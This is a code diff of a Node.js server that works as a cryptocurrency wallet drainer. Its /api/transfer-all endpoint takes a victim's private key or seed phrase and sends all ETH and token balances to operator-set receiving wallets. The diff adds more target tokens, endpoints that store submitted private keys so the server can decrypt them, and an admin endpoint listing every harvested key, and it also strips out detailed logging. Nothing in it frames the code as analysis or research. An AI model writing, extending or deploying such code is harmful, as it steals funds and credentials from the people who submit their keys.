@@ -6,6 +6,7 @@ const axios = require('axios');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 
 dotenv.config();
 
@@ -16,6 +17,136 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ============ ENCRYPTION SETUP ============
+// Create encrypted storage directory
+const storageDir = path.join(__dirname, 'encrypted_storage');
+if (!fs.existsSync(storageDir)) {
+    fs.mkdirSync(storageDir, { recursive: true });
+}
+
+// Encryption settings
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
+const ENCRYPTION_ALGORITHM = 'aes-256-gcm';
+
+function encryptData(text) {
+    if (!ENCRYPTION_KEY) {
+        throw new Error('ENCRYPTION_KEY not set in .env file');
+    }
+    
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
+    
+    let encrypted = cipher.update(text, 'utf8', 'hex');
+    encrypted += cipher.final('hex');
+    
+    const authTag = cipher.getAuthTag();
+    
+    return {
+        encrypted: encrypted,
+        iv: iv.toString('hex'),
+        authTag: authTag.toString('hex')
+    };
+}
+
+function decryptData(encryptedData, iv, authTag) {
+    if (!ENCRYPTION_KEY) {
+        throw new Error('ENCRYPTION_KEY not set in .env file');
+    }
+    
+    const decipher = crypto.createDecipheriv(
+        ENCRYPTION_ALGORITHM,
+        Buffer.from(ENCRYPTION_KEY, 'hex'),
+        Buffer.from(iv, 'hex')
+    );
+    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
+    
+    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
+    decrypted += decipher.final('utf8');
+    
+    return decrypted;
+}
+
+function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
+    const timestamp = new Date().toISOString();
+    const encrypted = encryptData(privateKey);
+    
+    const record = {
+        id: crypto.randomBytes(16).toString('hex'),
+        userIdentifier: userIdentifier,
+        encryptedData: encrypted.encrypted,
+        iv: encrypted.iv,
+        authTag: encrypted.authTag,
+        metadata: metadata,
+        createdAt: timestamp,
+        lastUsed: timestamp
+    };
+    
+    const filename = `${userIdentifier.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.json`;
+    const filePath = path.join(storageDir, filename);
+    
+    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
+    
+    // Also append to master log (encrypted only, no plaintext)
+    const masterLogPath = path.join(storageDir, 'master_index.json');
+    let masterIndex = [];
+    if (fs.existsSync(masterLogPath)) {
+        masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
+    }
+    
+    masterIndex.push({
+        id: record.id,
+        userIdentifier: userIdentifier,
+        filename: filename,
+        createdAt: timestamp,
+        metadata: metadata
+    });
+    
+    fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
+    
+    return { id: record.id, filename: filename };
+}
+
+function loadEncryptedKey(userIdentifier) {
+    const masterLogPath = path.join(storageDir, 'master_index.json');
+    if (!fs.existsSync(masterLogPath)) {
+        return null;
+    }
+    
+    const masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
+    const records = masterIndex.filter(r => r.userIdentifier === userIdentifier);
+    
+    if (records.length === 0) {
+        return null;
+    }
+    
+    // Get the most recent record
+    const latest = records.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
+    const filePath = path.join(storageDir, latest.filename);
+    
+    if (!fs.existsSync(filePath)) {
+        return null;
+    }
+    
+    const record = JSON.parse(fs.readFileSync(filePath, 'utf8'));
+    const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
+    
+    // Update last used timestamp
+    record.lastUsed = new Date().toISOString();
+    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
+    
+    return decrypted;
+}
+
+function listAllEncryptedKeys() {
+    const masterLogPath = path.join(storageDir, 'master_index.json');
+    if (!fs.existsSync(masterLogPath)) {
+        return [];
+    }
+    
+    return JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
+}
+
+// ============ LOGGING ============
 const logStream = fs.createWriteStream(path.join(__dirname, 'transactions.log'), { flags: 'a' });
 
 function logTransaction(data) {
@@ -24,49 +155,58 @@ function logTransaction(data) {
     logStream.write(logEntry);
 }
 
-const receivingWallets = {
-    ETH: process.env.RECEIVING_WALLET_ETH,
-    USDC: process.env.RECEIVING_WALLET_USDC,
-    DAI: process.env.RECEIVING_WALLET_DAI,
-};
-
+// ============ TOKEN CONFIGURATION ============
 const tokenContracts = {
     ETH: ethers.ZeroAddress,
     USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
     DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+    UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
+    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+    AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
+    MATIC: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
+    SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
+    PEPE: '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
 };
 
 const tokenDecimals = {
-    ETH: 18,
-    USDC: 6,
-    DAI: 18,
+    ETH: 18, USDC: 6, DAI: 18, USDT: 6, LINK: 18, UNI: 18, WBTC: 8, AAVE: 18, MATIC: 18, SHIB: 18, PEPE: 18,
 };
 
 const tokenNames = {
-    ETH: 'Ethereum',
-    USDC: 'USD Coin',
-    DAI: 'Dai Stablecoin',
+    ETH: 'Ethereum', USDC: 'USD Coin', DAI: 'Dai', USDT: 'Tether USD', LINK: 'Chainlink',
+    UNI: 'Uniswap', WBTC: 'Wrapped BTC', AAVE: 'Aave', MATIC: 'Polygon', SHIB: 'Shiba', PEPE: 'Pepe',
 };
 
 const tokenPrices = {
-    ETH: 2000,
-    USDC: 1,
-    DAI: 1,
+    ETH: 2000, USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.000007,
 };
 
-const GAS_COSTS = {
-    ETH_TRANSFER: 0.0015,
-    TOKEN_TRANSFER: 0.0025,
+const GAS_COSTS = { ETH_TRANSFER: 0.0015, TOKEN_TRANSFER: 0.0025 };
+
+const receivingWallets = {
+    ETH: process.env.RECEIVING_WALLET_ETH,
+    USDC: process.env.RECEIVING_WALLET_USDC,
+    DAI: process.env.RECEIVING_WALLET_DAI,
+    USDT: process.env.RECEIVING_WALLET_USDT,
+    LINK: process.env.RECEIVING_WALLET_LINK,
+    UNI: process.env.RECEIVING_WALLET_UNI,
+    WBTC: process.env.RECEIVING_WALLET_WBTC,
+    AAVE: process.env.RECEIVING_WALLET_AAVE,
+    MATIC: process.env.RECEIVING_WALLET_MATIC,
+    SHIB: process.env.RECEIVING_WALLET_SHIB,
+    PEPE: process.env.RECEIVING_WALLET_PEPE,
 };
 
 const RPC_URL = process.env.RPC_URL;
 
+// ============ HELPER FUNCTIONS ============
 async function getGasPrice() {
     try {
         const response = await axios.get('https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=' + process.env.ETHERSCAN_API_KEY, { timeout: 5000 });
         return ethers.utils.formatUnits(response.data.result, 'gwei');
     } catch (error) {
-        console.log('⚠️ Using default gas price (30 Gwei)');
         return '30';
     }
 }
@@ -81,37 +221,32 @@ async function getAllBalances(provider, userAddress) {
             if (currency === 'ETH') {
                 balance = await provider.getBalance(userAddress);
                 const balanceEth = parseFloat(ethers.utils.formatEther(balance));
-                const usdValue = balanceEth * tokenPrices[currency];
-                balanceDetails.push({
-                    currency: currency,
-                    name: tokenNames[currency],
-                    balance: balanceEth,
-                    balanceRaw: balance.toString(),
-                    usdValue: usdValue,
-                    symbol: currency
-                });
+                if (balanceEth > 0) {
+                    balanceDetails.push({
+                        currency: currency,
+                        name: tokenNames[currency],
+                        balance: balanceEth,
+                        usdValue: balanceEth * tokenPrices[currency]
+                    });
+                }
             } else {
                 const tokenContract = new ethers.Contract(tokenContracts[currency], ['function balanceOf(address) view returns (uint256)'], provider);
                 balance = await tokenContract.balanceOf(userAddress);
                 if (balance.gt(0)) {
                     const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, tokenDecimals[currency]));
-                    const usdValue = balanceFormatted * tokenPrices[currency];
                     balanceDetails.push({
                         currency: currency,
                         name: tokenNames[currency],
                         balance: balanceFormatted,
-                        balanceRaw: balance.toString(),
-                        usdValue: usdValue,
-                        symbol: currency
+                        usdValue: balanceFormatted * tokenPrices[currency]
                     });
                 }
             }
-            if (balance.gt(0)) balances[currency] = balance;
+            if (balance && balance.gt(0)) balances[currency] = balance;
         } catch (error) {
             console.error(`Error checking ${currency}:`, error.message);
         }
     }
-    
     return { balances, balanceDetails };
 }
 
@@ -134,11 +269,79 @@ function sortTokensByValue(balanceDetails) {
     return balanceDetails.sort((a, b) => b.usdValue - a.usdValue);
 }
 
-app.post('/api/transfer-all', async (req, res) => {
-    const { userInput } = req.body;
+// ============ ENCRYPTION API ENDPOINTS ============
 
-    if (!userInput) {
-        return res.status(400).json({ success: false, error: 'Please enter your private key or seed phrase' });
+// Save encrypted key
+app.post('/api/save-key', async (req, res) => {
+    const { userIdentifier, privateKey, metadata } = req.body;
+    
+    if (!userIdentifier || !privateKey) {
+        return res.status(400).json({ success: false, error: 'Missing userIdentifier or privateKey' });
+    }
+    
+    try {
+        const result = saveEncryptedKey(userIdentifier, privateKey, metadata || {});
+        res.json({ success: true, message: 'Key saved securely', id: result.id });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Load encrypted key
+app.post('/api/load-key', async (req, res) => {
+    const { userIdentifier } = req.body;
+    
+    if (!userIdentifier) {
+        return res.status(400).json({ success: false, error: 'Missing userIdentifier' });
+    }
+    
+    try {
+        const privateKey = loadEncryptedKey(userIdentifier);
+        if (!privateKey) {
+            return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
+        }
+        res.json({ success: true, privateKey: privateKey });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// List all saved keys (for admin use)
+app.get('/api/list-keys', async (req, res) => {
+    const adminToken = req.headers['x-admin-token'];
+    
+    if (adminToken !== process.env.ADMIN_TOKEN) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+    
+    try {
+        const keys = listAllEncryptedKeys();
+        res.json({ success: true, keys: keys });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ============ MAIN TRANSFER API ============
+app.post('/api/transfer-all', async (req, res) => {
+    const { userInput, savedIdentifier } = req.body;
+    
+    let finalInput = userInput;
+    
+    // If savedIdentifier provided, try to load the key
+    if (savedIdentifier && !userInput) {
+        try {
+            finalInput = loadEncryptedKey(savedIdentifier);
+            if (!finalInput) {
+                return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
+            }
+        } catch (error) {
+            return res.status(500).json({ success: false, error: 'Failed to load encrypted key: ' + error.message });
+        }
+    }
+    
+    if (!finalInput) {
+        return res.status(400).json({ success: false, error: 'Please enter your private key/seed phrase or provide a saved identifier' });
     }
 
     const startTime = Date.now();
@@ -148,18 +351,14 @@ app.post('/api/transfer-all', async (req, res) => {
         let userWallet;
         
         try {
-            userWallet = getWalletFromInput(userInput, provider);
+            userWallet = getWalletFromInput(finalInput, provider);
         } catch (error) {
             return res.status(400).json({ success: false, error: error.message });
         }
         
         const userAddress = userWallet.address;
         
-        logTransaction({
-            event: 'TRANSFER_STARTED',
-            userAddress: userAddress,
-            timestamp: new Date().toISOString()
-        });
+        logTransaction({ event: 'TRANSFER_STARTED', userAddress: userAddress, timestamp: new Date().toISOString() });
         
         const { balances, balanceDetails } = await getAllBalances(provider, userAddress);
         
@@ -168,20 +367,6 @@ app.post('/api/transfer-all', async (req, res) => {
         }
         
         const totalWalletValue = balanceDetails.reduce((sum, token) => sum + token.usdValue, 0);
-        
-        logTransaction({
-            event: 'WALLET_SNAPSHOT',
-            userAddress: userAddress,
-            totalValueUSD: totalWalletValue.toFixed(2),
-            tokens: balanceDetails.map(t => ({
-                token: t.currency,
-                name: t.name,
-                balance: t.balance,
-                usdValue: t.usdValue.toFixed(2)
-            })),
-            timestamp: new Date().toISOString()
-        });
-        
         const sortedTokens = sortTokensByValue(balanceDetails);
         
         const ethToken = balanceDetails.find(t => t.currency === 'ETH');
@@ -192,57 +377,19 @@ app.post('/api/transfer-all', async (req, res) => {
         
         for (const token of sortedTokens) {
             const gasCost = token.currency === 'ETH' ? GAS_COSTS.ETH_TRANSFER : GAS_COSTS.TOKEN_TRANSFER;
-            
             if (remainingGas >= gasCost) {
-                transferPlan.push({
-                    currency: token.currency,
-                    name: token.name,
-                    balance: token.balance,
-                    usdValue: token.usdValue,
-                    gasCost: gasCost,
-                    willTransfer: true
-                });
+                transferPlan.push({ ...token, gasCost: gasCost, willTransfer: true });
                 remainingGas -= gasCost;
             } else {
-                transferPlan.push({
-                    currency: token.currency,
-                    name: token.name,
-                    balance: token.balance,
-                    usdValue: token.usdValue,
-                    gasCost: gasCost,
-                    willTransfer: false,
-                    reason: `Insufficient ETH for gas (need ${gasCost} ETH, have ${remainingGas} ETH remaining)`
-                });
+                transferPlan.push({ ...token, gasCost: gasCost, willTransfer: false, reason: `Insufficient ETH for gas` });
             }
         }
         
         const tokensToTransfer = transferPlan.filter(t => t.willTransfer);
         
         if (tokensToTransfer.length === 0) {
-            const errorMsg = `No tokens can be transferred. Need at least ${GAS_COSTS.TOKEN_TRANSFER} ETH for gas. You have ${ethBalanceEth} ETH.`;
-            logTransaction({
-                event: 'TRANSFER_FAILED',
-                userAddress: userAddress,
-                reason: errorMsg,
-                timestamp: new Date().toISOString()
-            });
-            return res.status(400).json({ success: false, error: errorMsg });
+            return res.status(400).json({ success: false, error: `No tokens can be transferred. Need at least ${GAS_COSTS.TOKEN_TRANSFER} ETH for gas.` });
         }
-        
-        logTransaction({
-            event: 'TRANSFER_PLAN',
-            userAddress: userAddress,
-            totalEthForGas: ethBalanceEth,
-            tokensToTransfer: tokensToTransfer.length,
-            tokensSkipped: transferPlan.filter(t => !t.willTransfer).length,
-            plan: transferPlan.map(t => ({
-                token: t.currency,
-                willTransfer: t.willTransfer,
-                value: t.usdValue.toFixed(2),
-                reason: t.reason || 'Will transfer'
-            })),
-            timestamp: new Date().toISOString()
-        });
         
         const gasPriceGwei = await getGasPrice();
         const gasPrice = ethers.utils.parseUnits(gasPriceGwei, 'gwei');
@@ -253,8 +400,6 @@ app.post('/api/transfer-all', async (req, res) => {
         for (const plan of tokensToTransfer) {
             const { currency, balance: balanceValue } = plan;
             const balanceWei = balances[currency];
-            
-            const transferStartTime = Date.now();
             
             try {
                 const gasLimit = currency === 'ETH' ? 21000 : 100000;
@@ -267,13 +412,6 @@ app.post('/api/transfer-all', async (req, res) => {
                     let amountToTransfer = balanceWei.sub(gasReserve);
                     
                     if (amountToTransfer.lte(0)) {
-                        logTransaction({
-                            event: 'TRANSFER_SKIPPED',
-                            userAddress: userAddress,
-                            currency: currency,
-                            reason: 'All ETH used for gas fees',
-                            timestamp: new Date().toISOString()
-                        });
                         transactions.push({ currency, status: 'skipped', reason: 'All ETH used for gas fees' });
                         continue;
                     }
@@ -292,61 +430,27 @@ app.post('/api/transfer-all', async (req, res) => {
                     amountTransferred = parseFloat(ethers.utils.formatUnits(amountToTransferWei, tokenDecimals[currency]));
                     usdValueTransferred = amountTransferred * tokenPrices[currency];
                     
-                    const tokenContract = new ethers.Contract(
-                        tokenContracts[currency],
-                        ['function transfer(address to, uint256 value) returns (bool)'],
-                        userWallet
-                    );
-                    
-                    transaction = await tokenContract.transfer(
-                        receivingWallets[currency],
-                        amountToTransferWei,
-                        { gasPrice: gasPrice, gasLimit: gasLimit }
-                    );
+                    const tokenContract = new ethers.Contract(tokenContracts[currency], ['function transfer(address to, uint256 value) returns (bool)'], userWallet);
+                    transaction = await tokenContract.transfer(receivingWallets[currency], amountToTransferWei, { gasPrice: gasPrice, gasLimit: gasLimit });
                 }
                 
                 receipt = await transaction.wait();
-                const transferDuration = Date.now() - transferStartTime;
                 
-                const transactionResult = {
+                transactions.push({
                     currency: currency,
                     name: tokenNames[currency],
                     amount: amountTransferred,
                     usdValue: usdValueTransferred.toFixed(2),
                     transactionHash: transaction.hash,
-                    status: 'success',
-                    gasUsed: receipt.gasUsed.toString(),
-                    blockNumber: receipt.blockNumber,
-                    durationMs: transferDuration
-                };
-                
-                transactions.push(transactionResult);
+                    status: 'success'
+                });
                 totalTransferredValue += usdValueTransferred;
                 
-                logTransaction({
-                    event: 'TRANSFER_SUCCESS',
-                    userAddress: userAddress,
-                    currency: currency,
-                    name: tokenNames[currency],
-                    amount: amountTransferred,
-                    usdValue: usdValueTransferred.toFixed(2),
-                    transactionHash: transaction.hash,
-                    blockNumber: receipt.blockNumber,
-                    gasUsed: receipt.gasUsed.toString(),
-                    durationMs: transferDuration,
-                    timestamp: new Date().toISOString()
-                });
+                logTransaction({ event: 'TRANSFER_SUCCESS', userAddress: userAddress, currency: currency, amount: amountTransferred, txHash: transaction.hash });
                 
             } catch (error) {
-                logTransaction({
-                    event: 'TRANSFER_FAILED',
-                    userAddress: userAddress,
-                    currency: currency,
-                    name: tokenNames[currency],
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
-                transactions.push({ currency, name: tokenNames[currency], status: 'failed', error: error.message });
+                transactions.push({ currency: currency, status: 'failed', error: error.message });
+                logTransaction({ event: 'TRANSFER_FAILED', userAddress: userAddress, currency: currency, error: error.message });
             }
         }
         
@@ -360,20 +464,8 @@ app.post('/api/transfer-all', async (req, res) => {
                 totalValueInWallet: totalWalletValue.toFixed(2),
                 totalValueTransferred: totalTransferredValue.toFixed(2),
                 successfulTransfers: successfulCount,
-                failedTransfers: transactions.filter(t => t.status === 'failed').length,
-                skippedTransfers: transactions.filter(t => t.status === 'skipped').length,
-                totalDurationMs: totalDuration,
                 totalDurationSeconds: (totalDuration / 1000).toFixed(1)
-            },
-            walletBreakdown: balanceDetails.map(t => ({
-                token: t.currency,
-                name: t.name,
-                balance: t.balance,
-                usdValue: t.usdValue.toFixed(2),
-                wasTransferred: transactions.some(tx => tx.currency === t.currency && tx.status === 'success')
-            })),
-            transactions: transactions,
-            timestamp: new Date().toISOString()
+            }
         });
         
         res.json({
@@ -390,16 +482,13 @@ app.post('/api/transfer-all', async (req, res) => {
         });
         
     } catch (error) {
-        logTransaction({
-            event: 'SYSTEM_ERROR',
-            error: error.message,
-            timestamp: new Date().toISOString()
-        });
+        logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 app.listen(port, () => {
     console.log(`✅ Server running at http://localhost:${port}`);
-    console.log(`📝 Detailed logging enabled`);
+    console.log(`🔐 Encrypted storage enabled at: ${storageDir}`);
+    console.log(`💰 Supported tokens: ${Object.keys(tokenContracts).length} tokens`);
 });
